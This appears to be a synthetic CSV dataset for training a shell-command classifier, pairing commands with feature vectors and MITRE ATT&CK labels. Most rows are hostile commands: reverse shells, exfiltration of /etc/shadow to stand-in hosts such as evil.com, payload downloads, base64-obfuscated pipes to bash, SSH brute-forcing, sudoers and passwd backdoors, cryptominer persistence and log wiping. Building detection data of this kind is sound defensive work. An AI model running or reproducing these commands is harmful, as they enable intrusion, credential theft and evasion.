command,features,label,source
"bash -c ""echo 'cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxyZXRyaWV2ZSgnaHR0cDovL2V2aWwuY29tL3BheWxvYWQnLCAnL3RtcC9wYXlsb2FkJyki' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup nc -e /bin/bash attacker.com 80 &,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
"bash -c ""bash -i >& /dev/tcp/10.0.0.99/4444 0>&1""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo  'cm0gLXJmIC90bXAvKiAvdmFyL3RtcC8qIHwgc2xlZXAgMQ=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in | sleep 1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo echo 'cGVybCAtZSAndXNlIFNvY2tldDsgLi4uJw==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nmcli connection show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
nohup gcc exploit.c -o exploit && ./exploit &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
"bash -c ""curl -s http://c2.attacker.com/beacon""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
dmidecode -t system,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1082_System_Information_Discovery'],synthetic
usermod -aG sudo compromised_user && chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 1]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo echo 'bm9odXAgLi94bXJpZyAtLXVybCBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXhtci5jb206NDQzIC0tdXNlciB3YWxsZXQgJg==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
echo  'compromised  ALL=(ALL)  NOPASSWD:ALL'  >>  /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
time echo 'Y2F0IC9ldGMvcGFzc3dkIHwgYXdrIC1GOiAnJDMgPj0gMTAwMCc=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time cat /etc/shadow | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
nmap -sn 192.168.1.0/24 | chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0.2, 0.28, 1, 1]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
getent group sudo && sleep 1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxvcGVuKCdodHRwOi8vZXZpbC5jb20vPycgKyBvcGVuKCcvZXRjL3NoYWRvdycpLnJlYWQoKSki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1053_Scheduled_Task'],synthetic
"bash -c ""su - admin && echo done""","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1110_Brute_Force'],synthetic
nohup echo 'ZmluZCAvIC1wZXJtIC00MDAwIC10eXBlIGYgMj4vZGV2L251bGw=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
find /home -name '.env' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
nc -e /bin/bash attacker.com 80 | > /dev/null 2>&1,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo ip link show && chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 1]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time find / -name 'id_rsa' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
"bash -c ""echo 'aGVsbG8=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"bash -c ""echo 'Y3VybCAtcyBodHRwOi8vYzIuYXR0YWNrZXIuY29tL2JlYWNvbg==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
time nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
echo 'c2ggLWMgJ2N1cmwgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaCc=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -sL http://evil.com/shell.sh -o /tmp/shell.sh | echo done,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup ncrack -p 22 --user root -P pass.lst 10.0.0.1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1110_Brute_Force'],synthetic
echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOy4uLic=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'ZWNobyAnKi81ICogKiAqICogY3VybCBodHRwOi8vYzIuY29tL2JlYWNvbicgfCBjcm9udGFiIC0=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 ; echo done""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
hydra  -l  admin  -P  /usr/share/wordlists/rockyou.txt  ssh://10.0.0.1  ;  >  /dev/null  2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/group,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
time getent group sudo | history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
sudo grep -r 'password' /var/www/html --include='*.php',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
time echo 'cGVybCAtZSAndXNlIFNvY2tldDsgLi4uJw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet & ; echo done,"[0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1496_Resource_Hijacking', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlciB8IHNsZWVwIDE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
nohup reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe | > /dev/null 2>&1 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.52, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bm1hcCAtQSAtVDQgMTkyLjE2OC4xLjAvMjQgJiYgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
ssh -L 8080:internal:80 user@jump.host,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup masscan -p1-65535 10.0.0.0/24 --rate=1000 ; sleep 1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.36, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cm0gLXJmIC90bXAvKiAvdmFyL3RtcC8q' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo echo 'bGFzdCAtbiAxMA==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 ; chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 1]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
hostnamectl,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
echo 'TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcLi4uJyAtTmFtZSBQZXJzaXN0IC1WYWx1ZSAnQzpccGF5bG9hZC5leGUnIHwgY2htb2QgK3ggL3RtcC9wYXlsb2Fk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
medusa  -h  10.0.0.1  -u  root  -P  /tmp/passwords.txt  -M  ssh,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1110_Brute_Force'],synthetic
rm -rf /tmp/* /var/tmp/* ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
dmesg  |  head  -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['T1082_System_Information_Discovery'],synthetic
"bash -c ""for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.6, 0, 0]",['T1110_Brute_Force'],synthetic
traceroute  google.com,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
shred -u /var/log/auth.log,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo 'YWRkdXNlciAtLXNoZWxsIC9iaW4vYmFzaCAtLWRpc2FibGVkLXBhc3N3b3JkIGJhY2tkb29yIHwgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""whoami /all""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo 'aWZjb25maWcgLWEgOyBoaXN0b3J5IC1j' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup last -n 10 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
sudo echo 'dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIGdob3N0IHwgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
nohup echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers && > /dev/null 2>&1 &,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.48, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo at now + 1 minute <<< '/tmp/payload',"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1053_Scheduled_Task'],synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
nohup echo 'Y2F0IC9ldGMvZ3JvdXA=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
sudo mimikatz.exe 'sekurlsa::logonpasswords' exit,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo 'd2dldCAtcSAtTy0gLS1oZWFkZXI9J1gtQXV0aDogdG9rZW4xMjMnIGh0dHA6Ly9ldmlsLmNvbS9jbWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""masscan -p1-65535 10.0.0.0/24 --rate=1000""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.24, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
"bash -c ""cat /etc/os-release""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1082_System_Information_Discovery'],synthetic
wget http://attacker.com/payload -O /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
sudo echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'c3NoIGFkbWluQGxvY2FsaG9zdA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup find /var/log -name '*.log' -exec truncate -s 0 {} \; &,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo 'bWFzc2NhbiAtcDEtNjU1MzUgMTAuMC4wLjAvMjQgLS1yYXRlPTEwMDAgfCBjaG1vZCAreCAvdG1wL3BheWxvYWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo '' > /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo 'R2V0LUxvY2FsR3JvdXBNZW1iZXIgLUdyb3VwIEFkbWluaXN0cmF0b3Jz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
nmap -sn 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
"bash -c ""route -n""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1 && echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""cat /etc/hostname""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
"bash -c ""> ~/.bash_history && history -c""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]",['T1070_Indicator_Removal'],synthetic
"nmap -sV -p 22,80,443 10.0.0.0/24","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
nohup wget http://attacker.com/payload -O /tmp/payload &,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
"bash -c ""echo 'c2ggLWMgJ2N1cmwgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaCc=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup getent passwd | awk -F: '$3 >= 1000' &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
su -s /bin/bash www-data ; history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time nmap -sn 192.168.1.0/24 ; echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
id -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
